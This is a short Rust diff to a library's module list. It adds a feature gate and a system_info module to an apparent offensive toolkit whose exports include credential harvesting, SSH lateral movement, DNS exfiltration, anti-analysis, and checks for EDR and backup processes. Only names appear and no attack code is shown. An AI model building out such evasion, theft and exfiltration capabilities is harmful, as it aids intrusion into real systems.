@@ -3,6 +3,7 @@ pub mod identity;
 pub mod ldc;
 pub mod consensus;
 pub mod utils;
+#[cfg(feature = "ml")]
 pub mod ml;
 pub mod shared_arena;
 pub mod arena_mgr;
@@ -44,6 +45,7 @@ pub mod marl_online;
 pub mod larva;
 pub mod did;
 pub mod homomorphic;
+pub mod system_info;
 
 pub use comms::HiveChamber;
 pub use identity::AgentIdentity;
@@ -55,3 +57,4 @@ pub use anti_analysis::AntiAnalysis;
 pub use lateral::{harvest_credentials, exec_ssh, discover_hosts};
 pub use exfil::{dns_exfiltrate, ExfilScheduler};
 pub use attack::{generate_coverage_report, tag_action, techniques_by_module, TECHNIQUES};
+pub use system_info::{SystemInfo, LinuxInfo, WindowsInfo, PlatformInfo, is_edr_process, is_backup_process};
